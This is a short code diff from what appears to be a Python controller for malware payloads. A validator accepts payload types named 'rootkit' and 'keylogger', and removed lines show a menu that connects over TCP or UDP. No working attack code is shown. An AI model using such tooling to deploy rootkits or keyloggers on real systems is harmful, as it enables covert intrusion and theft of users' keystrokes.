@@ -73,15 +73,3 @@ class Main:
         "validates data from user"
         conn, port, type_ = con_tuple
         return conn in ["TCP", "UDP"] and isinstance(port, int) and type_ in ["ft", "rootkit", "keylogger"]
-
-
-            "Was the payload enchanted with file transfer (Y or N)").lower() == 'y' else 'rootkit'
-        if choice == "000":
-            pass
-        elif choice == "1":
-            ctrl.connect("TCP", port, type_)
-        elif choice == "2":
-            ctrl.connect("UDP", port, type_)
-    else:
-        notify("notify",
-               "Invalid Input {" + "{}".format(choice) + "}")
